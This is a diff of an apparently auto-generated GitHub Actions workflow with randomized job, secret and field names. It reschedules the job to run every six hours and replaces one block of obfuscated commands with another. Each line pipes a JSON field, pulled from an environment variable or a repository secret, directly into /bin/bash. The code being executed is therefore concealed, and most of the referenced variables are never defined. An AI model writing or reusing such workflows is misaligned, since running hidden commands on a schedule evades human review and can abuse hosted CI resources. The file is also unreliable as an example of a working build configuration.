@@ -2,7 +2,8 @@ name: leihuoba7834
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 0/6 * * *'
+    - cron: '53 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,25 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: leihuoba7834
         env:
-          ioqw29: ${{ secrets.ioqw29 }}
+          qh86: ${{ secrets.qh86 }}
         run: |
-          echo $ioqw29 | jq -r .l05429 | /bin/bash
-          echo $s0132 | jq -r .f6564 | /bin/bash
-          echo $itlpl262 | jq -r .dsi0424 | /bin/bash
-          echo $fbg603 | jq -r .qgmvm496 | /bin/bash
-          echo $n3134 | jq -r .e3 | /bin/bash
-          echo $xtsbt6753 | jq -r .naekg1666 | /bin/bash
-          echo $po3 | jq -r .uuit5 | /bin/bash
-          echo $pxw7 | jq -r .haoj1487 | /bin/bash
-          echo $hv0188 | jq -r .xlco8792 | /bin/bash
-          echo $va93 | jq -r .zje83 | /bin/bash
-          echo $znm628 | jq -r .bzwqt05 | /bin/bash
-          echo $ihd49 | jq -r .rg2 | /bin/bash
-          echo $foo2085 | jq -r .qn6 | /bin/bash
-          echo $xxayi0 | jq -r .dux47 | /bin/bash
-          echo $jagm475 | jq -r .hjtwi3 | /bin/bash
-          echo $kgxx644 | jq -r .to8 | /bin/bash
-          echo $i97335 | jq -r .trjo47 | /bin/bash
-          echo $is235 | jq -r .qkd96 | /bin/bash
-          echo $vdxjf9123 | jq -r .mp009 | /bin/bash
+          echo $qh86 | jq -r .gsnzc9 | /bin/bash
+          echo $jro4 | jq -r .g2 | /bin/bash
+          echo $zfz612 | jq -r .eyl54 | /bin/bash
+          echo $h2 | jq -r .n1029 | /bin/bash
+          echo $whcme8916 | jq -r .x6 | /bin/bash
+          echo $ro11503 | jq -r .jtrn4 | /bin/bash
+          echo $c71413 | jq -r .soi57517 | /bin/bash
+          echo $etf029 | jq -r .ciu08266 | /bin/bash
+          echo $abb7739 | jq -r .mpb591 | /bin/bash
+          echo $wrrh7 | jq -r .l470 | /bin/bash
+          echo $jj78443 | jq -r .yiv20867 | /bin/bash
 
